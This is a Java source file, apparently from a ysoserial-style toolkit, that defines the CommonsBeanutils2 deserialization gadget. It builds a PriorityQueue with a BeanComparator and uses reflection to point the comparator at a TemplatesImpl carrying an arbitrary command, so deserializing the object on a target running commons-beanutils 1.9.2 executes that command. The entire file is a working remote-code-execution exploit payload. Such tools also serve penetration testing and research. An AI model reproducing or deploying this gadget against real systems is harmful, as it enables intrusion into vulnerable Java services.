package A.R.ysogate.payloads.gadgets;

import org.apache.commons.beanutils.BeanComparator;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.Reflections;

import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
public class CommonsBeanutils2 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object         template   = Gadgets.createTemplatesImpl(command);
		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		Reflections.setFieldValue(comparator, "property", "outputProperties");
		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

		return queue;
	}
}
